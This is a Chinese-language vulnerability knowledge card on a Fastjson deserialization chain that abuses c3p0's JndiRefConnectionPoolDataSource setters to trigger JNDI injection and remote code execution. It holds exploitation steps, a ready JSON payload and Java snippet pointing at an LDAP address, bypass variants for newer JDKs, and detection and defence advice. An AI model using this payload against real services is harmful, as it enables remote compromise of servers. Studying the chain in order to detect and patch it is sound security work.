---
id: web-java-deser-fastjson-c3p0-jndiref-jndi
title: Fastjson 触发 C3P0 JndiRefConnectionPoolDataSource setter 链导致 JNDI 注入
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-c3p0-jndiref-jndi
aliases:
- C3P0 JNDI 注入
- JndiRefConnectionPoolDataSource
- JndiRefForwardingDataSource lookup
- Fastjson C3P0 JNDI
- setLoginTimeout 触发 lookup
tags:
- java
- fastjson
- c3p0
- jndi
- deserialization
- autotype
- ldap
- rmi
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: c3p0 0.9.5.2；fastjson 1.2.24
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:32:03+08:00'
  notes: 已对照原文核对 JndiRefConnectionPoolDataSource.setLoginTimeout→WrapperConnectionPoolDataSource→JndiRefForwardingDataSource.inner/dereference→InitialContext.lookup 调用链与 fastjson payload；未验证点：未在本机复现，原文于 JDK 8u102 验证，高版本受 JNDI codebase 限制
---

## 一句话结论

在 Fastjson 允许 AutoType（或存在等价 setter 注入）时，构造 `@type` 为 `com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource` 的 JSON，先设置 `jndiName` 指向恶意 LDAP/RMI 服务，再触发 `LoginTimeout` 的 setter，即可沿 C3P0 内部调用链走到 `InitialContext.lookup()`，造成 JNDI 注入。

## 原理

- Fastjson 解析 `@type` 时会实例化目标类，并按 JSON 字段调用对应的 setter。`JndiRefConnectionPoolDataSource` 有 `setJndiName(String)` 与 `setLoginTimeout(int)`。
- `setJndiName` 只保存字符串；`setLoginTimeout` 会调用内部 `WrapperConnectionPoolDataSource` 的 `setLoginTimeout`。
- `WrapperConnectionPoolDataSource.setLoginTimeout` 调用 `getNestedDataSource().setLoginTimeout(seconds)`；`getNestedDataSource()` 返回一个 `JndiRefForwardingDataSource`（`nestedDataSource` 字段）。
- `JndiRefForwardingDataSource.setLoginTimeout` 调用 `inner().setLoginTimeout(seconds)`；`inner()` 在没有缓存时调用 `dereference()`。
- `dereference()` 中执行 `InitialContext.lookup((String) jndiName)`。`jndiName` 已由攻击者通过 `setJndiName` 设置为恶意 LDAP/RMI 地址，lookup 触发远程对象加载/反序列化。
- 该链的最终危害取决于 JNDI 利用条件：JDK 8u191+ 默认限制 LDAP 远程 codebase，需要改用本地工厂类（如 Tomcat BeanFactory + EL）或其他绕过；RMI 也受 `com.sun.jndi.rmi.object.trustURLCodebase` 等限制。

## 触发条件

- 目标使用 Fastjson（原文 1.2.24，默认允许 AutoType）或 Jackson 等可触发任意 setter 的反序列化组件；高版本 Fastjson 需先绕过 AutoType 限制。
- classpath 含 c3p0（原文 0.9.5.2）。
- 目标可出网访问攻击者控制的 LDAP/RMI 服务，或使用本地 JNDI 工厂 gadget。
- 目标 JDK 未完全阻断对应的 JNDI 远程类加载（高版本需额外绕过）。

## 利用步骤

1. 确认 Fastjson 版本/AutoType 状态与 c3p0 依赖。
2. 启动恶意 LDAP/RMI 服务，准备可执行的 JNDI 对象/gadget。
3. 构造 JSON：`@type` 指向 `JndiRefConnectionPoolDataSource`，`jndiName` 指向恶意地址，另加 `LoginTimeout` 字段触发 setter。
4. 发送到 Fastjson 解析入口；观察目标向 LDAP/RMI 服务发起连接及后续命令执行。
5. 若目标 JDK 较高，改用本地 BeanFactory/EL 等不出网 gadget 或对应绕过。

## PoC

```json
{
  "@type": "com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource",
  "jndiName": "ldap://127.0.0.1:1389/eee",
  "LoginTimeout": "1"
}
```

```java
// 等价的直接调用（用于本地验证链路）
import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource;

public class C3P0Jndi {
    public static void main(String[] args) throws Exception {
        JndiRefConnectionPoolDataSource ds = new JndiRefConnectionPoolDataSource();
        ds.setJndiName("ldap://127.0.0.1:1389/eee");
        ds.setLoginTimeout(1);   // 触发 inner() -> dereference() -> lookup
    }
}
```

```text
# 攻击者侧可用 LDAP/RMI 服务返回恶意 Reference/序列化对象；
# 目标侧应出现对 1389 端口的连接与后续利用行为。
```

## 变体与关联

- 变体：`jndiName` 指向 RMI、LDAP、LDAPS 等协议；不同协议受不同 JDK 信任属性限制。
- 变体：高版本 JDK 下改用本地 `BeanFactory` + `ELProcessor` 的 JNDI 绕过（参见不出网卡片）。
- 变体：Jackson 多态反序列化同样可调用这些 setter，触发链一致。
- 关联：[[web-java-deser-fastjson-jdbc-rowset]]（另一条 Fastjson → JNDI 链）；[[web-java-deser-c3p0-beanfactory-el-no-egress]]（C3P0 的不出网 BeanFactory 利用）；[[web-java-deser-c3p0-poolbackeddatasourcebase-urlclassloader]]（C3P0 原生反序列化链）。
- 边界：Fastjson 关闭 AutoType 且无绕过、JDK 完全阻断远程 codebase、目标不出网且无本地 gadget 时，链不成立。案例在 JDK 8u102 上验证。

## 检测与防御

- 检测：监控 Fastjson 请求中出现 `com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource`、`JndiRefForwardingDataSource` 等类名；监控 JVM 对 LDAP/RMI 端口的异常外连；审计 `InitialContext.lookup` 调用与 JNDI 客户端行为。
- 修复：升级 Fastjson 并关闭 AutoType/使用 safeMode；移除或升级 c3p0；对反序列化入口做类白名单。
- 加固：JDK 升级到限制远程 codebase 的版本并保持默认安全属性；禁止不必要的出网；使用 RASP/IAST 检测 JNDI 注入。
